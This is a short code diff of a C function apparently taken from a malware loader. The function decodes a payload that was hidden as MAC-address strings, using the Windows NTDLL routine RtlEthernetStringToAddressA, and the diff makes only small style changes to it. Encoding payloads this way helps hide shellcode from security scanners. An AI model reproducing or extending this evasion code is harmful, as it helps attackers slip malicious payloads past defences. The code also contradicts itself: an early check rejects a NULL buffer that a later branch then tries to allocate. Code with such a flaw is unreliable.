@@ -12,17 +12,17 @@ BOOLEAN RtlMacToStrA
 {
 	if (!pPayloadArray || !NmbrOfElements || !*pClearPayloadAddress || !pClearPayloadSize) return FALSE;
 
-	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
+	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlEthernetStringToAddressA");
 
 	if (pRtlEthernetStringToAddressA == NULL) return FALSE;
 
 	SIZE_T sBufferSize = NmbrOfElements * MAC + 1;
 
-	if (!*pClearPayloadAddress) *pClearPayloadAddress = LocalAlloc(LPTR, sBufferSize);
+	if (*pClearPayloadAddress == NULL) *pClearPayloadAddress = LocalAlloc(LPTR, sBufferSize);
 	else
 	{
 		LocalFree(*pClearPayloadAddress);
-		if (!(*pClearPayloadAddress = LocalAlloc(LPTR, sBufferSize))) return FALSE;
+		if ((*pClearPayloadAddress = LocalAlloc(LPTR, sBufferSize)) == NULL) return FALSE;
 	}
 	memset(*pClearPayloadAddress, '\0', sBufferSize);
 
